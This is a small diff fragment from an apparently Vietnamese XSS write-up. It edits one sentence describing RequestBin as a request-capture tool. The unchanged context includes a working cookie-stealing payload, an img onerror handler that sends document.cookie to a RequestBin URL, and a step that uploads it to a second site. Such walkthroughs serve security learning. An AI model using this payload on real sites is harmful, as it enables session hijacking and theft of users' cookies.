@@ -109,7 +109,7 @@ Chúng ta có thể thấy khi create đoạn text lên site 1 sẽ bị decode 
 ><img src=1 href=1 onerror="javascript:document.location='https://[RequestBinURL]?cookie='+document.cookie"></img>
 ```
 
-`RequestBin` sẽ là công cụ như là `container request` cung cấp cơ chế trong đó server-side sẽ gọi đến client-side khi bắt một sự kiện nhất định nào đó.
+`RequestBin` là công cụ như `container request` cung cấp cơ chế trong đó server-side sẽ gọi đến client-side khi bắt một sự kiện nhất định nào đó.
 
 Mình đến site thứ 2 và upload đoạn đã decode kèm theo XSS ở site 1 vào
 
